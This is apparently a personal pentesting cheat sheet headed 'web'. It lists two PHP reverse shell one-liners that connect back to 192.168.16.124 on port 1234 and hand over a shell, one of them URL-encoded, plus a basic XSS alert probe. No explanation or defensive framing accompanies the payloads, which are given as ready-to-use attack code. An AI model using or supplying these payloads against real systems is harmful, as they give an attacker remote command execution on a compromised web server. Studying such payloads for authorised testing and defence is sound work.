# web

PHP
---

Reverse shell one-liners:

<?php $s=fsockopen(\"192.168.16.124\",1234);exec("sh<%263>%263 2>%263");?>

<?php $s=fsockopen("192.168.16.124",1234);exec("sh<&3>&3 2>&3") ;?>


XSS
---

<script>alert("XSS")</script>